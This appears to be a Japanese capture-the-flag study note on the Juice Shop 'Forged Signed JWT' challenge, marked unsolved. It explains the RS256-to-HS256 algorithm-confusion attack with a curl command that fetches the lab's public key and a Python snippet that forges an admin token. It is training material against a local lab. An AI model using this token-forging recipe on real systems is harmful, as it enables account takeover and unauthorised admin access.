# Forged Signed JWT ❌

**難易度:** ⭐⭐⭐⭐⭐⭐
**カテゴリ:** JWT
**目標:** RSA署名付きJWTを偽造する（アルゴリズム混乱攻撃）

## ヒント

- **脆弱性:** RS256 → HS256 アルゴリズム混乱
- **原理:** 公開鍵を HMAC シークレットとして使用
- **公開鍵:** `/encryptionkeys/jwt.pub`

## アルゴリズム混乱攻撃

```
通常: RS256 (RSA + SHA256)
- 秘密鍵で署名、公開鍵で検証

攻撃: HS256 (HMAC + SHA256) に変更
- 公開鍵を「共有シークレット」として使用
- 攻撃者は公開鍵を持っている → 署名可能
```

## 手順

1. 公開鍵を取得
```bash
curl http://localhost:3000/encryptionkeys/jwt.pub
```

2. JWT ヘッダーを RS256 → HS256 に変更
```json
{"alg": "HS256", "typ": "JWT"}
```

3. 公開鍵を使って HMAC 署名
```python
import jwt
import requests

# 公開鍵取得
pub_key = requests.get('http://localhost:3000/encryptionkeys/jwt.pub').text

# ペイロード
payload = {
    "email": "admin@juice-sh.op",
    "role": "admin"
}

# HS256 で署名（公開鍵をシークレットとして使用）
token = jwt.encode(payload, pub_key, algorithm='HS256')
```

## ツール

- jwt_tool: https://github.com/ticarpi/jwt_tool
- PyJWT: `pip install pyjwt`

## 検証ポイント

- [ ] 公開鍵を取得
- [ ] アルゴリズム変更でトークン生成
- [ ] サーバーが受け入れるか

## 解説

[未着手]
